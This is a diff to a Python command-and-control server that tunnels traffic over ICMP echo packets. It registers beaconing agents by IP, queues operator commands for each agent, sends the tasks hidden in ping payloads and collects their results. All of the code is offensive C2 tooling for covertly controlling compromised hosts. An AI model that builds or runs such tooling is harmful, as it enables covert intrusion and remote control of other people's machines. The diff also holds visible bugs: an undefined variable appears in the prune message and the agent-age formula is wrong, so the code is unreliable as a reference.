@@ -3,9 +3,11 @@ import time
 import os
 import threading
 
-COMMANDS = {}
+COMMANDS = {} #agent_id -> list of commands
+ACTIVE_AGENTS = set() #set of active agent ids
 AGENT_INFO = {} #agent_id -> {"ip","last_seen"}
 RESULTS = {} #agent_id -> list of results
+INACTIVITY_TIMEOUT = 120 # number of seconds before agent becomes stale
 
 lock = threading.Lock()
 
@@ -27,44 +29,57 @@ def get_next_agent_id():
     return f"{next_id:03d}"  # format as 3-digit string
 
 def handle_packet(pkt):
-    print("packet received")
-    print(pkt.summary())
-    if ICMP in pkt and pkt[ICMP].type == 8 and Raw in pkt:
-        payload = pkt[Raw].load.decode(errors="ignore")
-        fields = payload.split("|", 3)
-        msg_type, result = fields
-        # Only accept packets with custom payloads
-        if msg_type != "BEACON" and msg_type != "RESULT":
-            return  # ignore noise or non-client pings
+    try:
+        if ICMP in pkt and pkt[ICMP].type == 8 and Raw in pkt:
+            payload = pkt[Raw].load.decode(errors="ignore")
+            if "|" not in payload:
+                return
 
-        src = pkt[IP].src
-        print(f"\n[+] Valid client packet from {src}: {payload}")
+            msg_type, result = payload.split("|", 1)
 
-        # Check if this IP is already registered
-        agent_id = None
-        for aid, info in AGENT_INFO.items():
-            if info["ip"] == src:
-                agent_id = aid
-                break
-        
-        # If this is a new agent, assign next available ID
-        if not agent_id:
-            agent_id = get_next_agent_id()
-            AGENT_INFO[agent_id] = {"ip": src, "last_seen": time.time()}
-            print(f"\n[+] New agent connected: {agent_id} ({src})")
-        else:
-            # Update last_seen timestamp
-            AGENT_INFO[agent_id]["last_seen"] = time.time()
+            # Only accept packets with custom payloads
+            if msg_type != "BEACON" and msg_type != "RESULT":
+                return  # ignore noise or non-client pings
 
-        # If there is a command queued, send it. Else, do nothing.
-        if msg_type == "BEACON" and COMMANDS:
-            task = COMMANDS.pop()
-            # Build reply packet as an echo request so it is routed properly.
-            send(IP(dst=src)/ICMP(type=8)/task.encode(), verbose=0)
-            print(f"[+] Sent task to {agent_id} ({src}): {task}")
+            src = pkt[IP].src
+            print(f"\n[+] Valid client packet from {src}: {payload}")
 
-        elif msg_type == "RESULT":
-                RESULTS.setdefault(agent_id, []).append((result))
+            # Check if this IP is already registered
+            agent_id = None
+            for aid, info in AGENT_INFO.items():
+                if info["ip"] == src:
+                    agent_id = aid
+                    break
+            
+            # If this is a new agent, assign next available ID
+            if not agent_id:
+                agent_id = get_next_agent_id()
+                AGENT_INFO[agent_id] = {"ip": src, "last_seen": time.time()}
+                ACTIVE_AGENTS.add(agent_id)
+                print(f"\n[+] New agent connected: {agent_id} ({src})")
+            else:
+                # Update last_seen timestamp
+                AGENT_INFO[agent_id]["last_seen"] = time.time()
+
+            # If there is a command queued, send it. Else, do nothing.
+            if msg_type == "BEACON":
+                queue = COMMANDS.get(agent_id)
+                if not queue:
+                    return
+
+                task = queue.pop(0)   # get ONE command (FIFO)
+                # Build reply packet as an echo request so it is routed properly.
+                send(IP(dst=src)/ICMP(type=8)/task.encode(), verbose=0)
+                print(f"[+] Sent task to {agent_id} ({src}): {task}")
+
+                if not queue:
+                    COMMANDS.pop(agent_id, None)
+
+            elif msg_type == "RESULT":
+                # Store results as 2-tuples with a timestamp
+                RESULTS.setdefault(agent_id, []).append((time.time(), result))
+    except Exception as e:
+        print(f"!Handler exception: {e}")
 
 def operator_console():
     print()
@@ -101,30 +116,29 @@ def operator_console():
             print("  exit                         - Stop the server")
             continue
 
-        # if cmd == "list":
-        #     with lock:
-        #         now = time.time()
-        #         # Lazy prune stale agents
-        #         for agent in list(ACTIVE_AGENTS):
-        #             if now - LAST_SEEN.get(agent, 0) > INACTIVITY_TIMEOUT:
-        #                 ACTIVE_AGENTS.remove(agent)
-        #                 LAST_SEEN.pop(agent, None)
-        #                 COMMANDS.pop(agent, None)
-        #                 RESULTS.pop(agent, None)
-        #                 AGENT_INFO.pop(agent, None)
-        #                 print(f"[PRUNE] Removed stale agent {agent}")
+        if cmd == "list":
+            with lock:
+                now = time.time()
+                # Lazy prune stale agents
+                for agent_id in list(ACTIVE_AGENTS):
+                    if now - AGENT_INFO[agent_id]["last_seen"] > INACTIVITY_TIMEOUT:
+                        ACTIVE_AGENTS.remove(agent_id)
+                        COMMANDS.pop(agent_id, None)
+                        RESULTS.pop(agent_id, None)
+                        AGENT_INFO.pop(agent_id, None)
+                        print(f"[PRUNE] Removed stale agent {agent}")
 
-        #         if not ACTIVE_AGENTS:
-        #             print("No active agents.")
-        #         else:
-        #             print("[*] Active agents (" + str(len(ACTIVE_AGENTS)) + "):")
-        #             for agent in sorted(ACTIVE_AGENTS):
-        #                 info = AGENT_INFO.get(agent, {})
-        #                 ip = info.get('ip', 'unknown')
-        #                 host = info.get('hostname', 'unknown')
-        #                 age = int(now - LAST_SEEN.get(agent, now))
-        #                 print(f" - id={agent} ip={ip} host={host} age={age}s")
-        #     continue
+                if not ACTIVE_AGENTS:
+                    print("No active agents.")
+                else:
+                    print("[*] Active agents (" + str(len(ACTIVE_AGENTS)) + "):")
+                    for agent in sorted(ACTIVE_AGENTS):
+                        info = AGENT_INFO.get(agent, {})
+                        ip = info.get('ip', 'unknown')
+                        host = info.get('hostname', 'unknown')
+                        age = int(now - now - AGENT_INFO[agent_id]["last_seen"])
+                        print(f" - id={agent} ip={ip} host={host} age={age}s")
+            continue
 
         # if cmd == "info":
         #     if len(parts) < 2:
